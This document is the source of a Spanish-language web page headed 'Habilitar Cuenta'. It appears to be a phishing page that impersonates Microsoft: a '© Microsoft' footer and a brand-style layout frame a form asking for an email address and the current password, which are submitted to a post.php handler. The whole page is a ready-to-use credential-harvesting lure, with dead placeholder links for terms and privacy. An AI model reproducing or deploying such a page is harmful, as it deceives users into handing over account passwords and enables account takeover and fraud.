<html>
<head>
<style>
input[type=password] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}
input[type=text] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}
input[type=email] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}

h1 {
	font-family: "Helvetica Neue";
	font-size: 40px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 40px;
}
h2 {
	font-family: "Helvetica";
	font-size: 17px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 18px;
}
h3 {
	font-family: "Helvetica Neue";
	font-size: 16px;
	font-style: normal;
	font-variant: normal;
	font-weight: 300;
	line-height: 18px;
	color: #4d79ff;
}
h4 {
	font-family: "Helvetica Neue";
	font-size: 11px;
	font-style:normal;
	font-variant: normal;
	font-weight: 300;
	line-height: 23px;
}
.error {
	font-family: "Helvetica";
	font-size: 17px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 20px;
	color:#ff1a1a;
}
a:link {
 text-decoration:none;
 color: #4d79ff;
}
a:visited {
 text-decoration:none;
 color: #4d79ff;
}



    @-webkit-keyframes rotate {
    from {
        -webkit-transform: rotate(0deg);
    }
    to {
        -webkit-transform: rotate(360deg);
    }
}
#loading {
    border: 1px solid #000;
    border-right: 0;
    border-bottom: 0;
    -webkit-border-radius: 100px;
    height: 100px;
    width: 100px;
    margin: 100px;
    -webkit-transition: all 0.5s ease-in;
    -webkit-animation-name:             rotate;
    -webkit-animation-duration:         1.0s;
    -webkit-animation-iteration-count:  infinite;
    -webkit-animation-timing-function: linear;
}

.loader {
    border: 6px solid #f3f3f3; /* Light grey 16 */
    border-top: 6px solid rgba(77,86,92,0.87); /* #3498db Blue */
    border-radius: 50%;
    width: 60px;/*120*/
    height: 60px;/*120*/
    animation: spin 1s linear infinite;
    position: fixed;
    top: 250px;
    left: 48%;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}


</style>
</head>

<body>

<div align=center>
<form name="form1" id="form1" method="post" action="post.php">
<table width="1000" border="0" cellspacing="1" cellpadding="2">
<tr>
	<td colspan="4"><div align="center"><img id="superior" src="flag-up.png" width="364" height="54"></div><br><br></td>
</tr>
<tr>
	<td colspan="4"><div align="center"><h1>Habilitar Cuenta</h1></div></td>
</tr>
<tr>
	<td colspan="4"><div align="left"><h2></h2></div></td>
</tr>
<tr>
	<td colspan="4">
		<div align="center"><input type="email"  name="campo1" placeholder="Ingrese su cuenta de correo" required></div>
	</td>
</tr>
<tr>
	<td colspan="4">
		<div align="center"><input type="password"  name="campo2" placeholder="Ingrese su contrase&ntilde;a actual" required ></div>
		
	</td>
</tr>


<tr>
	
    <td colspan="4"><div align="center"><br><br>

	<div><input type="submit" style="background-color: #2987DA; color:white; width:150px; height: 35px; border:none" value="Siguiente" width="250px"/></div>

	
	
	<!--<input type="image" name="imageField" src="buttonc.png" />-->
   </div><br><br><br></td>
</tr>

<tr>
	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
	<td width="160"><div align="center"><h3><a target="_blank" href="">T&eacute;rminos de uso</a></h3></div></td>
	<td width="160"><div align="center"><h3><a target="_blank" href="">Privacidad y Cookies</a></h3></div></td>
	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
</tr>


<tr>
	<td colspan="4"><div align="center"> <h4>&copy; <?php echo date('Y'); ?> Microsoft.</h4></div><br><br></td>
</tr>

</table>
</form>
</div>
</body>
</html>